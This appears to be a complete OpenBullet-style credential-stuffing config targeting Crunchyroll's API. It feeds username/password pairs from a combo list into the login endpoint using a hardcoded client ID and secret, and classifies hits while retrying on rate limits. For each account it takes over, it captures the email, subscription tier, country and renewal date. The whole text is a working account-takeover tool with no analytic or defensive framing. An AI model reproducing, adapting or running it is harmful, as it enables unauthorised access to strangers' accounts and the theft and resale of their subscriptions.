[SCRIPT]
FUNCTION GenerateGUID -> VAR "Dororo" 

FUNCTION GenerateGUID -> VAR "saiyanwarriorgoku" 

FUNCTION URLEncode "<USER>" -> VAR "Bankai Minazuki" 

FUNCTION URLEncode "<PASS>" -> VAR "Yachiru Unohana" 

REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token" 
  CONTENT "grant_type=password&username=<Bankai Minazuki>&password=<Yachiru Unohana>&scope=offline_access&client_id=o7uowy7q4lgltbavyhjq&client_secret=lqrjETNx6W7uRnpcDm8wRVj8BChjC1er&device_type=SamsungTV&device_id=<saiyanwarriorgoku>&device_name=Goku" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 
  HEADER "host: beta-api.crunchyroll.com" 
  HEADER "x-datadog-sampling-priority: 0" 
  HEADER "content-type: application/x-www-form-urlencoded" 
  HEADER "accept-encoding: gzip" 
  HEADER "user-agent: Crunchyroll/3.74.2 Android/10 okhttp/4.12.0" 

PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" -> VAR "Vegito" 

PARSE "<SOURCE>" LR "\"profile_id\":\"" "\"" -> VAR "Yachiru Unohana" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "access_token" 
  KEYCHAIN Failure OR 
    KEY "invalid_grant" 
    KEY "error" 
    KEY "invalid_grant" 
    KEY "access_token.invalid" 
    KEY "auth.obtain_access_token.force_password_reset" 
  KEYCHAIN Retry OR 
    KEY "You are being rate limited" 

REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me" 
  
  HEADER "User-Agent: Crunchyroll/3.48.2 Android/9 okhttp/4.12.0" 
  HEADER "Authorization: Bearer <Vegito>" 

PARSE "<SOURCE>" LR "\"email_verified\":" "," CreateEmpty=FALSE -> CAP "Email verified" 

PARSE "<SOURCE>" LR "\"external_id\":\"" "\"" -> VAR "GOKU" 

PARSE "<SOURCE>" LR ",\"email\":\"" "\"" -> VAR "saiyanwarrior" 

REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<GOKU>/products" 
  
  HEADER "Host: beta-api.crunchyroll.com" 
  HEADER "authorization: Bearer <Vegito>" 
  HEADER "accept-encoding: gzip" 
  HEADER "user-agent: Crunchyroll/3.68.0 Android/9 okhttp/4.12.0" 

PARSE "<SOURCE>" LR "" "" -> VAR "Escanor" 

PARSE "<SOURCE>" LR ",\"sku\":\"" "\"" -> VAR "Majin Vegeta" 

IF "<Majin Vegeta>" EqualTo ""

FUNCTION Constant "Gift Access" -> VAR "Majin Vegeta" 

ELSE
ENDIF

PARSE "<SOURCE>" LR "\"is_subscribable\":" "," -> VAR "Gogeta" 

REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<GOKU>/benefits" 
  
  HEADER "Host: beta-api.crunchyroll.com" 
  HEADER "authorization: Bearer <Vegito>" 
  HEADER "x-datadog-sampling-priority: 0" 
  HEADER "etp-anonymous-id: <Dororo>" 
  HEADER "accept-encoding: gzip" 
  HEADER "user-agent: Crunchyroll/3.68.0 Android/9 okhttp/4.12.0" 

PARSE "<SOURCE>" LR "" "" -> VAR "BankaiMinazuki" 

PARSE "<SOURCE>" LR "\"total\":" "," -> VAR "Unohana Retsu" 

PARSE "<SOURCE>" LR "\"subscription_country\":\"" "\"" -> VAR "VEGETA" 

PARSE "<SOURCE>" LR "\"benefit\":\"concurrent_" "\"" -> VAR "Goku" "[" "]" 

FUNCTION Translate 
  KEY "[streams.4]" VALUE "MEGA FAN MEMBER" 
  KEY "[streams.1]" VALUE "FAN MEMBER" 
  KEY "[streams.6]" VALUE "ULTIMATE FAN MEMBER" 
  "<Goku>" -> VAR "Majin vegeta" 

FUNCTION Constant "〖<Majin vegeta>〗-[<Majin Vegeta>]" -> CAP "Plan" 

FUNCTION Constant "<Gogeta>" -> CAP "Subscription" 

REQUEST GET "https://beta-api.crunchyroll.com/subs/v4/accounts/<Yachiru Unohana>/subscriptions" 
  
  HEADER "User-Agent: Crunchyroll/3.48.2 Android/9 okhttp/4.12.0" 
  HEADER "Authorization: Bearer <Vegito>" 

IF "<SOURCE>" Contains "\"nextRenewalDate\":\""

PARSE "<SOURCE>" LR "\"nextRenewalDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 

FUNCTION GetRemainingDay "<Expiry>" -> CAP "Remaining days" 

FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry>" -> VAR "GOGETA" 

FUNCTION CurrentUnixTime -> VAR "VEGITO" 

ELSE
ENDIF

